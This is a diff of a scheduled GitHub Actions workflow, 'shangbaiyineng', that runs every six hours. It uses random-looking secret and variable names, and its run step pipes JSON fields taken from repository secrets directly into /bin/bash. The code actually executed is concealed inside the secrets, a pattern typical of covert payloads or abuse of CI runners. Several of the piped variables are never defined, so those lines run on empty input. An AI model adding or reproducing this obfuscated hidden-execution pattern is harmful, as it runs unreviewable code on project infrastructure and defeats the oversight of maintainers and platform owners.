@@ -2,17 +2,21 @@ name: shangbaiyineng
 on:
   workflow_dispatch:
   schedule:
-    - cron: '7 0/6 * * *'
+    - cron: '18 2/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: shangbaiyineng
         env:
-          wmiyf02556: ${{ secrets.wmiyf02556 }}
+          qo3499: ${{ secrets.qo3499 }}
         run: |
-          echo $wmiyf02556 | jq -r .gosa122 | /bin/bash
-          echo $vet93 | jq -r .i8002 | /bin/bash
+          echo $qo3499 | jq -r .mqvch00862 | /bin/bash
+          echo $bwt8 | jq -r .rb39303 | /bin/bash
+          echo $hdw6127 | jq -r .wlhx71 | /bin/bash
+          echo $xh821 | jq -r .gqf403 | /bin/bash
+          echo $ljnjt099 | jq -r .ofod3113 | /bin/bash
 
